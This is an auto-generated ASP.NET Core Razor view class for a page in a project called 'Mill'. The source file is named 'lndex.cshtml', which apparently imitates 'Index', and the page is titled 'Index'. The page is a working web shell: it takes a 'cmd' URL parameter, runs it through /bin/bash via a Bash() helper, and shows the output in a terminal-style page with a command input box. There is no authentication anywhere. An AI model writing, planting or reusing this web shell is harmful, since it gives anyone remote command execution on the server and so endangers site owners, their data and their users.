#pragma checksum "C:\Users\Jannis\source\repos\Mill\Mill\Views\Home\lndex.cshtml" "{ff1816ec-aa5e-4d10-87f7-6f4963833460}" "7965fdf9fde9676be58c8a8e8dfe96b159c04f7d"
// <auto-generated/>
#pragma warning disable 1591
[assembly: global::Microsoft.AspNetCore.Razor.Hosting.RazorCompiledItemAttribute(typeof(AspNetCore.Views_Home_lndex), @"mvc.1.0.view", @"/Views/Home/lndex.cshtml")]
[assembly:global::Microsoft.AspNetCore.Mvc.Razor.Compilation.RazorViewAttribute(@"/Views/Home/lndex.cshtml", typeof(AspNetCore.Views_Home_lndex))]
namespace AspNetCore
{
    #line hidden
#line 1 "C:\Users\Jannis\source\repos\Mill\Mill\Views\Home\lndex.cshtml"
using System;

#line default
#line hidden
    using System.Collections.Generic;
    using System.Linq;
    using System.Threading.Tasks;
    using Microsoft.AspNetCore.Mvc;
    using Microsoft.AspNetCore.Mvc.Rendering;
    using Microsoft.AspNetCore.Mvc.ViewFeatures;
#line 1 "C:\Users\Jannis\source\repos\Mill\Mill\Views\_ViewImports.cshtml"
using Mill;

#line default
#line hidden
#line 2 "C:\Users\Jannis\source\repos\Mill\Mill\Views\_ViewImports.cshtml"
using Mill.Models;

#line default
#line hidden
#line 2 "C:\Users\Jannis\source\repos\Mill\Mill\Views\Home\lndex.cshtml"
using System.Diagnostics;

#line default
#line hidden
    [global::Microsoft.AspNetCore.Razor.Hosting.RazorSourceChecksumAttribute(@"SHA1", @"7965fdf9fde9676be58c8a8e8dfe96b159c04f7d", @"/Views/Home/lndex.cshtml")]
    [global::Microsoft.AspNetCore.Razor.Hosting.RazorSourceChecksumAttribute(@"SHA1", @"1f1bcde661e5e69446cfef13d26b6e418bb83023", @"/Views/_ViewImports.cshtml")]
    public class Views_Home_lndex : global::Microsoft.AspNetCore.Mvc.Razor.RazorPage<dynamic>
    {
        #pragma warning disable 1998
        public async override global::System.Threading.Tasks.Task ExecuteAsync()
        {
            BeginContext(42, 2, true);
            WriteLiteral("\r\n");
            EndContext();
#line 4 "C:\Users\Jannis\source\repos\Mill\Mill\Views\Home\lndex.cshtml"
  
    ViewData["Title"] = "Index";
    var result = "";
    var cmd = Context.Request.Query["cmd"];
    if (!String.IsNullOrEmpty(cmd))
    {
        result = Bash(cmd);
    }

    if (String.IsNullOrEmpty(result))
    {
        result = "Invalid command or something didn't work";
    }


#line default
#line hidden
            BeginContext(351, 2, true);
            WriteLiteral("\r\n");
            EndContext();
            BeginContext(1007, 1810, true);
            WriteLiteral(@"


<script src=""https://code.jquery.com/jquery-3.2.1.min.js""
        integrity=""sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=""
        crossorigin=""anonymous""></script>
<script>
$(function() {
    var cmdResult = $(""#cmdResult"");

	console.log(cmdResult);

	if (cmdResult.text() === ""Invalid command or something didn't work""){
	    console.log(""should change text"");
        cmdResult.css(""color"", ""red"");
	}

	var term = $(""#console"");
    $(""#cmd"").focus();
	term.scrollTop(term.prop(""scrollHeight""));

	$.urlParam = function(name){
        var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
        if (results==null){
           return null;
        }
        else{
           return decodeURI(results[1]) || 0;
        }
    }


	function executeCmd(){
        var cmd = encodeURIComponent($(""#cmd"").val());
	    var currentCmd = $.urlParam('cmd');
	    console.log(""should replace: "" + currentCmd + "" WITH: "" + cmd);

	    var currentUrl = lo");
            WriteLiteral(@"cation.href;

	    var paramDelimeter = """";
	    if (currentUrl.indexOf(""?"") < 0){
	        paramDelimeter = ""?"";
	    } else {
	        paramDelimeter = ""&"";
	    }

	    if (currentUrl.indexOf(""cmd="") < 0){
            currentUrl = location.href + paramDelimeter + ""cmd="";
	    }

        var newUrl = currentUrl.replace(/cmd=.*/, ""cmd=""+cmd);
        window.location.href = newUrl;

	    //console.log(newUrl);
	}

    $(""#submitCommand"").click(function(){
	    executeCmd();
	})

	$(""#cmd"").keypress(function (e) {
	    if (e.which == 13) {
	        executeCmd();
	        return false;
	    }
	});

	$(""#cmd"").on(""change paste keyup"", function(theVal){
	    var cmd = $(""#cmd"").val();
	    $(""#cmdInput"").text(cmd);
	});
});

</script>


<h3>");
            EndContext();
            BeginContext(2818, 17, false);
#line 120 "C:\Users\Jannis\source\repos\Mill\Mill\Views\Home\lndex.cshtml"
Write(ViewData["Title"]);

#line default
#line hidden
            EndContext();
            BeginContext(2835, 12, true);
            WriteLiteral(".</h3>\r\n<h4>");
            EndContext();
            BeginContext(2848, 19, false);
#line 121 "C:\Users\Jannis\source\repos\Mill\Mill\Views\Home\lndex.cshtml"
Write(ViewData["Message"]);

#line default
#line hidden
            EndContext();
            BeginContext(2867, 83, true);
            WriteLiteral("</h4>\r\n<h4>Output for:> <span style=\"font-family: monospace; font-weight: normal;\">");
            EndContext();
            BeginContext(2951, 3, false);
#line 122 "C:\Users\Jannis\source\repos\Mill\Mill\Views\Home\lndex.cshtml"
                                                                       Write(cmd);

#line default
#line hidden
            EndContext();
            BeginContext(2954, 110, true);
            WriteLiteral("</span></h4>\r\n\r\n\r\n<pre id=\"console\" style=\"color: #00ff00;background-color: #141414;max-height: 606px;\">\r\nC#:>");
            EndContext();
            BeginContext(3065, 3, false);
#line 126 "C:\Users\Jannis\source\repos\Mill\Mill\Views\Home\lndex.cshtml"
Write(cmd);

#line default
#line hidden
            EndContext();
            BeginContext(3068, 26, true);
            WriteLiteral("\r\n\t\r\n<span id=\"cmdResult\">");
            EndContext();
            BeginContext(3095, 6, false);
#line 128 "C:\Users\Jannis\source\repos\Mill\Mill\Views\Home\lndex.cshtml"
                Write(result);

#line default
#line hidden
            EndContext();
            BeginContext(3101, 307, true);
            WriteLiteral(@"</span>
	
C#:><span id=""cmdInput""></span>
</pre>

<br />

<p>Enter your command below:</p>
<span style=""display: inline-flex !important;"">
    <input id=""cmd"" class=""form-control"" type=""text"" style=""width: 400px;"" />
    <button id=""submitCommand"" class=""btn btn-primary"">Send!</button>
</span>
");
            EndContext();
        }
        #pragma warning restore 1998
#line 20 "C:\Users\Jannis\source\repos\Mill\Mill\Views\Home\lndex.cshtml"
           
    public static string Bash(string cmd)
    {
        var result = "";
        var escapedArgs = cmd.Replace("\"", "\\\"");
        var process = new Process()
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "/bin/bash",
                Arguments = $"-C \"{escapedArgs}\"",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            }
        };

        process.Start();
        result = process.StandardOutput.ReadToEnd();
        process.WaitForExit();

        return result;
    }

#line default
#line hidden
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.ViewFeatures.IModelExpressionProvider ModelExpressionProvider { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.IUrlHelper Url { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.IViewComponentHelper Component { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.Rendering.IJsonHelper Json { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.Rendering.IHtmlHelper<dynamic> Html { get; private set; }
    }
}
#pragma warning restore 1591
